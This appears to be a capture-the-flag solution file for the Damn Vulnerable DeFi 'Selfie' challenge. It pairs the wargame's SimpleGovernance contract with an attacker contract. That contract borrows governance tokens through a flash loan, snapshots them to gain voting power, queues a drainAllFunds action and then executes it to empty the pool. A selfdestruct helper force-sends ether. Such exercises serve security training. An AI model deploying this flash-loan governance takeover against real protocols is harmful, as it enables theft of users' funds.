// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
//import "@openzeppelin/contracts/utils/Address.sol";
import "./Address.sol";
import "./SelfiePool.sol";
import "hardhat/console.sol";
/**
 * @title SimpleGovernance
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SimpleGovernance {

    using Address for address;
    
    struct GovernanceAction {
        address receiver;
        bytes data;
        uint256 weiAmount;
        uint256 proposedAt;
        uint256 executedAt;
    }
    
    DamnValuableTokenSnapshot public governanceToken;

    mapping(uint256 => GovernanceAction) public actions;
    uint256 private actionCounter;
    uint256 private ACTION_DELAY_IN_SECONDS = 2 days;

    event ActionQueued(uint256 actionId, address indexed caller);
    event ActionExecuted(uint256 actionId, address indexed caller);

    constructor(address governanceTokenAddress) {
        require(governanceTokenAddress != address(0), "Governance token cannot be zero address");
        governanceToken = DamnValuableTokenSnapshot(governanceTokenAddress);
        actionCounter = 1;
    }
    
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256) {
        require(_hasEnoughVotes(msg.sender), "Not enough votes to propose an action");
        require(receiver != address(this), "Cannot queue actions that affect Governance");

        uint256 actionId = actionCounter;

        GovernanceAction storage actionToQueue = actions[actionId];
        actionToQueue.receiver = receiver;
        actionToQueue.weiAmount = weiAmount;
        actionToQueue.data = data;
        actionToQueue.proposedAt = block.timestamp;

        actionCounter++;

        emit ActionQueued(actionId, msg.sender);
        return actionId;
    }

    function executeAction(uint256 actionId) external payable {
        require(_canBeExecuted(actionId), "Cannot execute this action");
        
        GovernanceAction storage actionToExecute = actions[actionId];
        actionToExecute.executedAt = block.timestamp;
	console.log("Wei Amount of the action: %s", actionToExecute.weiAmount);
        actionToExecute.receiver.functionCallWithValue(
            actionToExecute.data,
            actionToExecute.weiAmount
        );

        emit ActionExecuted(actionId, msg.sender);
    }

    function getActionDelay() public view returns (uint256) {
        return ACTION_DELAY_IN_SECONDS;
    }

    /**
     * @dev an action can only be executed if:
     * 1) it's never been executed before and
     * 2) enough time has passed since it was first proposed
     */
    function _canBeExecuted(uint256 actionId) private view returns (bool) {
        GovernanceAction memory actionToExecute = actions[actionId];
        return (
            actionToExecute.executedAt == 0 &&
            (block.timestamp - actionToExecute.proposedAt >= ACTION_DELAY_IN_SECONDS)
        );
    }
    
    function _hasEnoughVotes(address account) private view returns (bool) {
        uint256 balance = governanceToken.getBalanceAtLastSnapshot(account);
        uint256 halfTotalSupply = governanceToken.getTotalSupplyAtLastSnapshot() / 2;
        return balance > halfTotalSupply;
    }
}



contract GovernanceAttack {
    SimpleGovernance public governanceContract;
    SelfiePool public victimPool;
    DamnValuableTokenSnapshot public tokenDVT;
    address payable public attackerAddress;
    address public myOwnAddress;
    uint256 public actionId;
    ForceSendEther public sendEtherByForce ;

    constructor (address _governAddr, address _poolAddr, address _dvtAddr, address _attackerAddr, address _forceAddr ){
        governanceContract = SimpleGovernance(_governAddr);
        victimPool = SelfiePool(_poolAddr);
        tokenDVT = DamnValuableTokenSnapshot(_dvtAddr);
        attackerAddress = payable(_attackerAddr);
        myOwnAddress = address(this);
        sendEtherByForce = ForceSendEther(payable(_forceAddr));
	console.log("Contract attacker address: %s",address(this));
    }

    function attackQueue() public {
        /*victimPool.flashLoan(1);
        tokenDVT.transfer(address(this),1);
        tokenDVT.approve(address(this),2**256-1);
        tokenDVT.transfer(attackerAddress,1);*/
        tokenDVT.approve(address(this),2**256-1);
        victimPool.flashLoan(1500000 ether);
    }
    function attackExecute() public {
	address payable _govAddr = payable(address(governanceContract));
	_govAddr.call{value: 1 ether}("");	
        console.log("balance of the ATTACKER: %s", address(this).balance);
	//this.sendTransaction{to: _govAddr, value: 500 gwei}("");
	//_govAddr.transfer(500 gwei);
	sendEtherByForce.attackSendEther(_govAddr);
	console.log("balance of Simple Governance: %s", _govAddr.balance);
        governanceContract.executeAction(actionId);
	tokenDVT.transfer(attackerAddress,tokenDVT.balanceOf(address(this)));
    }

/*    function receiveTokens(address _tokenAddr, uint256 _amount) public {
        DamnValuableTokenSnapshot localToken = DamnValuableTokenSnapshot(_tokenAddr);
        //localToken.approve(myOwnAddress,2 ** 256 -1);
        //localToken.transfer(address(governanceContract),_amount);
        bytes calldata _callDrain = abi.encodeWithSignature ( "drainAllFunds(address)",address(this));
        actionId=governanceContract.queueAction(victimPool,_callDrain,_amount);
        localToken.transfer(address(victimPool), _amount);
    }*/

    function receiveTokens(address _tokenAddr, uint256 _amount) public {
        //DamnValuableTokenSnapshot localToken = DamnValuableTokenSnapshot(_tokenAddr);
        //localToken.approve(myOwnAddress,2 ** 256 -1);
        //localToken.transfer(address(governanceContract),_amount);
        //bytes calldata _callDrain = abi.encodeWithSignature ( "drainAllFunds(address)",address(this));
	tokenDVT.snapshot();
        actionId=governanceContract.queueAction(address(victimPool),abi.encodeWithSignature ( "drainAllFunds(address)",address(this)),0);
        tokenDVT.transfer(address(victimPool), _amount);
    }

    receive() external payable{}

}

contract ForceSendEther {

	function attackSendEther(address payable _addr)public {
	    selfdestruct(_addr);
	}
	receive() external payable{}

}
